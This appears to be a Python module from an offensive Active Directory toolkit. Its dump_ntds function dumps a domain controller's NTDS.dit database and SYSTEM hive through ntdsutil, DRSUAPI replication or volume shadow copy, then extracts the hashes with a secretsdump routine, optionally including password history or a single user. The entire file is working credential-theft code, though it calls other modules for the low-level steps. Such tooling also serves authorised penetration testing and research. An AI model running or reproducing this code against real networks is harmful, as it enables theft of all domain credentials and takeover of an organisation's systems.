from __future__ import annotations

from pathlib import Path
from typing import Optional

from .. import console
from .target import Target

METHODS = ("ntdsutil", "drsuapi", "vss")


def dump_ntds(
    method: str,
    target: Target,
    session_dir: Path,
    history: bool = False,
    just_user: Optional[str] = None,
) -> Path:
    if method not in METHODS:
        raise ValueError(f"Unknown dump method: {method!r}. Choose from {METHODS}.")

    output_prefix = session_dir / "dump"

    if method in ("drsuapi", "vss"):
        from .remote import dump_remote

        return dump_remote(target, output_prefix, method=method, history=history, just_user=just_user)

    from .ntdsutil import download_ntds_files
    from .remote import secretsdump_local

    raw_dir = session_dir / "ntdsutil"
    download_ntds_files(target, raw_dir)

    system_hive = raw_dir / "SYSTEM"
    ntds_dit = raw_dir / "ntds.dit"
    if not (system_hive.exists() and ntds_dit.exists()):
        raise RuntimeError("Missing ntds.dit or SYSTEM hive after ntdsutil dump.")

    return secretsdump_local(system_hive, ntds_dit, output_prefix, history=history)


__all__ = ["Target", "dump_ntds", "METHODS"]
